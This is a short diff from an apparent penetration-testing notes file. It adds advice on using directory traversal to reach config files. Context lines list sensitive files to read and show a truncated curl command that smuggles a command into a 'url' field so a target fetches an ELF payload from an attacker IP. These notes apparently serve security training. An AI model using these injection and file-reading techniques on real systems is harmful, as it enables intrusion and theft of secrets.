@@ -1962,6 +1962,7 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
   - Check .ssh directory
   - /etc/php/7.4/apache2/php.ini
   - /var/log/apache2/access.log
+- When we find directory traversal, check what's running(maybe other website or etc) and see if we can get any config files through dt
 
 ### Filename Prefix
 ```bash
